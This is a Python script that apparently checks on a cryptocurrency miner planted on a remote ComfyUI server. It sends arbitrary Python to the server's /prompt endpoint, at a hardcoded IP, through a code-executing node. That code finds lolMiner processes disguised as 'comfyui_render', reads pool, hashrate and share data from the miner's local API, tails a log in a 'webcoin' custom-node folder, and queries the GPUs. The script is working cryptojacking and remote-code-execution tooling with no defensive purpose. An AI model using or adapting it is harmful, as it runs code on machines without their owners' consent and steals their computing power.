"""Check GPU miner status and logs on remote machine."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

code = """
import os, subprocess, urllib.request, json

lines = []

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else None

# Check GPU miner process
try:
    import psutil
    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
        try:
            name = (proc.info.get('name') or '').lower()
            if 'comfyui_render' in name or 'lolminer' in name:
                cmd = ' '.join(proc.info.get('cmdline') or [])
                lines.append('GPU_PROC: pid=' + str(proc.info['pid']) + ' status=' + proc.info['status'])
                lines.append('GPU_CMD: ' + cmd[:300])
        except:
            pass
except:
    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if 'comfyui_render' in line or 'lolminer' in line.lower():
            lines.append('PS: ' + line.strip()[:200])

# Check lolMiner API
try:
    req = urllib.request.Request('http://127.0.0.1:44882', headers={'Accept': 'application/json'})
    with urllib.request.urlopen(req, timeout=5) as r:
        data = json.loads(r.read().decode())
        lines.append('API_OK: software=' + data.get('Software', ''))
        workers = data.get('Workers', [])
        for w in workers:
            lines.append('GPU: ' + w.get('Name', '?') + ' power=' + str(w.get('Power', 0)) + 'W')
        algos = data.get('Algorithms', [])
        for a in algos:
            lines.append('ALGO: ' + a.get('Algorithm', '') + ' pool=' + a.get('Pool', '') + ' perf=' + str(a.get('Total_Performance', 0)))
            lines.append('SHARES: accepted=' + str(a.get('Total_Accepted', 0)) + ' rejected=' + str(a.get('Total_Rejected', 0)) + ' errors=' + str(a.get('Total_Errors', 0)))
except Exception as e:
    lines.append('API_FAIL: ' + str(e)[:200])

# Read render.log
if target:
    logpath = os.path.join(target, 'bin', 'render.log')
    if os.path.exists(logpath):
        with open(logpath, 'r', errors='replace') as f:
            content = f.read()
        lines.append('render.log (' + str(len(content)) + ' chars):')
        if content:
            for l in content.splitlines()[-30:]:
                lines.append('  ' + l.strip()[:200])
        else:
            lines.append('  (empty)')
    else:
        lines.append('render.log: not found')

# Check nvidia-smi
try:
    r = subprocess.run(['nvidia-smi', '--query-gpu=index,name,memory.total,memory.used,utilization.gpu,temperature.gpu', '--format=csv,noheader'], capture_output=True, text=True, timeout=10)
    lines.append('nvidia-smi:')
    for l in r.stdout.strip().splitlines():
        lines.append('  ' + l.strip())
except Exception as e:
    lines.append('nvidia-smi: ' + str(e)[:100])

result = chr(10).join(lines)
"""

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(12)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
